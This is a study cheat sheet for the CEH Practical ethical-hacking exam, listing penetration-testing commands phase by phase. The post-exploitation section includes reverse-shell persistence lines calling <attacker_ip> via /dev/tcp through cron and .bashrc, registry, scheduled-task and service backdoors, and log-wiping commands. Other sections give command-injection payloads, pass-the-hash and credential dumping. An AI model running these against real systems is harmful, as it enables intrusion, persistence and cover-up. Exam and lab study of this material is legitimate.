# CEH Practical Exam - Penetration Testing Methodology

## Phase 1: Reconnaissance & Information Gathering

### Network Discovery
- **Network Sweeping**
  - `nmap -sn <network_range>` (ping sweep)
  - `fping -a -g <network_range>`
  - `netdiscover -r <network_range>`

### Host Discovery & OS Detection
- `nmap -O <target_ip>` (OS fingerprinting)
- `nmap -A <target_ip>` (aggressive scan)
- `p0f -i <interface>` (passive OS detection)

---

## Phase 2: Scanning & Port Discovery

### TCP Port Scanning
- **Basic TCP Scan**: `nmap -sS <target_ip>`
- **Full TCP Scan**: `nmap -p- <target_ip>`
- **Common Ports**: `nmap -sS -O <target_ip>`
- **Stealth Scan**: `nmap -sS -f <target_ip>`

### UDP Port Scanning
- **UDP Scan**: `nmap -sU --top-ports 1000 <target_ip>`
- **Fast UDP**: `nmap -sU -F <target_ip>`

### Service Version Detection
- `nmap -sV <target_ip>`
- `nmap -sV --version-intensity 9 <target_ip>`

---

## Phase 3: Enumeration

### Web Application Enumeration
- **Directory Brute Force**
  - `dirb http://<target_ip>/ /usr/share/wordlists/dirb/common.txt`
  - `gobuster dir -u http://<target_ip>/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt`
  - `wfuzz -c -z file,/usr/share/wordlists/dirb/common.txt --hc 404 http://<target_ip>/FUZZ`

- **Technology Stack Detection**
  - `whatweb <target_ip>`
  - `nikto -h <target_ip>`
  - Manual inspection of headers, source code

### SMB/NetBIOS Enumeration (Windows)
- **Share Enumeration**
  - `enum4linux <target_ip>`
  - `smbclient -L //<target_ip>/ -N`
  - `smbmap -H <target_ip>`
  - `rpcclient -U "" -N <target_ip>`

- **Null Session Testing**
  - `net use \\<target_ip>\IPC$ "" /user:""`
  - `smbclient //<target_ip>/IPC$ -N`

### SNMP Enumeration
- `snmpwalk -c public -v1 <target_ip>`
- `snmp-check <target_ip>`
- `onesixtyone -c community.txt <target_ip>`

### DNS Enumeration
- `dnsrecon -d <domain> -t axfr`
- `dig @<dns_server> <domain> axfr`
- `nslookup` interactive mode
- `fierce -dns <domain>`

### FTP Enumeration
- Anonymous login testing: `ftp <target_ip>`
- `nmap --script ftp-* <target_ip>`

### SSH Enumeration
- Version detection: `ssh <target_ip>`
- `nmap --script ssh-* <target_ip>`

### Database Enumeration
- **MySQL**: `nmap --script mysql-* <target_ip>`
- **MSSQL**: `nmap --script ms-sql-* <target_ip>`
- **Oracle**: `nmap --script oracle-* <target_ip>`

---

## Phase 4: Vulnerability Assessment

### Automated Vulnerability Scanning
- `nmap --script vuln <target_ip>`
- `nessus` (if available in exam environment)
- `openvas` (if available)

### Manual Vulnerability Testing
- **Web Applications**
  - SQL injection testing with `sqlmap`
  - XSS testing with custom payloads
  - File upload vulnerabilities
  - Directory traversal testing

- **Network Services**
  - Default credentials testing
  - Weak authentication mechanisms
  - Unpatched service versions

---

## Phase 5: Exploitation

### Windows Exploitation

#### SMB/NetBIOS Exploits
- **EternalBlue (MS17-010)**
  - Detection: `nmap --script smb-vuln-ms17-010 <target_ip>`
  - Exploitation: `use exploit/windows/smb/ms17_010_eternalblue`

- **SMBv1 Vulnerabilities**
  - `use exploit/windows/smb/ms08_067_netapi`
  - `use exploit/windows/smb/ms06_025_rasmans_reg`

#### RDP Exploitation
- **BlueKeep (CVE-2019-0708)**
  - Detection: `nmap --script rdp-vuln-ms12-020 <target_ip>`
  - Exploitation: `use exploit/windows/rdp/cve_2019_0708_bluekeep_rce`

#### Windows Service Exploits
- **Weak Service Permissions**
  - `sc qc <service_name>`
  - `accesschk.exe -uwcqv "Authenticated Users" *`

#### Password Attacks
- **Hash Cracking**
  - `john --format=NT hashes.txt`
  - `hashcat -m 1000 hashes.txt wordlist.txt`
- **Pass-the-Hash**
  - `pth-winexe -U <domain>/<user>%<hash> //<target_ip> cmd`

### Linux Exploitation

#### SSH Brute Force
- `hydra -l <username> -P /usr/share/wordlists/rockyou.txt ssh://<target_ip>`
- `medusa -h <target_ip> -u <username> -P wordlist.txt -M ssh`

#### Web Application Exploits
- **SQL Injection**
  - `sqlmap -u "http://<target_ip>/page.php?id=1" --dbs`
  - `sqlmap -u "http://<target_ip>/page.php?id=1" --os-shell`

- **Command Injection**
  - Manual testing with payloads: `; id`, `| whoami`, `&& uname -a`

#### Privilege Escalation (Linux)
- **SUID Binaries**: `find / -perm -4000 2>/dev/null`
- **Sudo Privileges**: `sudo -l`
- **Kernel Exploits**: `uname -a` then search exploit-db
- **Cron Jobs**: `cat /etc/crontab`, `ls -la /etc/cron*`

#### File System Exploitation
- **NFS Shares**
  - `showmount -e <target_ip>`
  - `mount -t nfs <target_ip>:/<share> /mnt/nfs`

---

## Phase 6: Post-Exploitation

### Windows Post-Exploitation

#### System Information Gathering
- `systeminfo`
- `whoami /all`
- `net user`
- `net localgroup administrators`
- `wmic qfe list` (patches installed)

#### Privilege Escalation
- **Windows Exploit Suggester**
  - `python windows-exploit-suggester.py --database 2021-01-01-mssb.xls --systeminfo systeminfo.txt`
- **PowerUp.ps1**
  - `Import-Module .\PowerUp.ps1; Invoke-AllChecks`
- **WinPEAS**
  - `winpeas.exe`

#### Persistence Mechanisms
- **Registry Run Keys**
  - `reg add "HKLM\Software\Microsoft\Windows\CurrentVersion\Run" /v backdoor /t REG_SZ /d "C:\backdoor.exe"`
- **Scheduled Tasks**
  - `schtasks /create /tn "backdoor" /tr "C:\backdoor.exe" /sc onstart`
- **Service Creation**
  - `sc create backdoor binpath= "C:\backdoor.exe" start= auto`

#### Credential Harvesting
- **Mimikatz**
  - `privilege::debug`
  - `sekurlsa::logonpasswords`
  - `sekurlsa::wdigest`
- **LaZagne**
  - `laZagne.exe all`

### Linux Post-Exploitation

#### System Information Gathering
- `uname -a`
- `id`
- `sudo -l`
- `cat /etc/passwd`
- `ps aux`
- `netstat -tulpn`

#### Privilege Escalation
- **LinPEAS**: `./linpeas.sh`
- **Linux Exploit Suggester**: `./linux-exploit-suggester.sh`
- **GTFOBins**: Check for SUID binaries and their exploitation

#### Persistence Mechanisms
- **Cron Jobs**
  - `echo "* * * * * /bin/bash -c 'bash -i >& /dev/tcp/<attacker_ip>/<port> 0>&1'" | crontab -`
- **SSH Keys**
  - `mkdir ~/.ssh; echo "<public_key>" >> ~/.ssh/authorized_keys`
- **Bashrc Modification**
  - `echo "bash -i >& /dev/tcp/<attacker_ip>/<port> 0>&1" >> ~/.bashrc`

#### Log Clearing
- `history -c`
- `rm ~/.bash_history`
- `echo "" > /var/log/auth.log`
- `echo "" > /var/log/syslog`

---

## Phase 7: Reporting & Documentation

### Evidence Collection
- Screenshots of successful exploits
- Command outputs showing system access
- Proof-of-concept files
- Network diagrams
- Timeline of activities

### Key Findings Documentation
- Vulnerability summary with CVSS scores
- Exploitation paths and techniques used
- Business impact assessment
- Remediation recommendations
- Risk matrix classification

---

## CEH Practical Exam Specific Tips

### Time Management
- Allocate 30 minutes for reconnaissance and scanning
- Spend 60-90 minutes on exploitation attempts
- Reserve 30 minutes for post-exploitation and documentation

### Common Exam Scenarios
1. **Web Application with SQL Injection**
2. **Windows Machine with SMB Vulnerabilities**
3. **Linux Server with Weak SSH Configuration**
4. **Network Service with Default Credentials**
5. **Privilege Escalation Challenges**

### Essential Tools for CEH Practical
- **Nmap**: Port scanning and service detection
- **Metasploit**: Exploitation framework
- **Burp Suite**: Web application testing
- **SQLMap**: SQL injection testing
- **John the Ripper**: Password cracking
- **Netcat**: Network communication
- **Wireshark**: Network analysis
- **Hydra**: Brute force attacks

### Quick Reference Commands

#### Network Discovery
```bash
nmap -sn 192.168.1.0/24
nmap -p- -sS -sV -O <target_ip>
```

#### Web Testing
```bash
dirb http://<target_ip>/
sqlmap -u "http://<target_ip>/page.php?id=1" --dbs
```

#### Windows Exploitation
```bash
use exploit/windows/smb/ms17_010_eternalblue
set RHOSTS <target_ip>
exploit
```

#### Linux Privilege Escalation
```bash
find / -perm -4000 2>/dev/null
sudo -l
cat /etc/crontab
```

Remember to document every step and maintain detailed notes throughout the exam process. The CEH Practical emphasizes hands-on exploitation skills, so focus on actually compromising systems rather than just identifying vulnerabilities.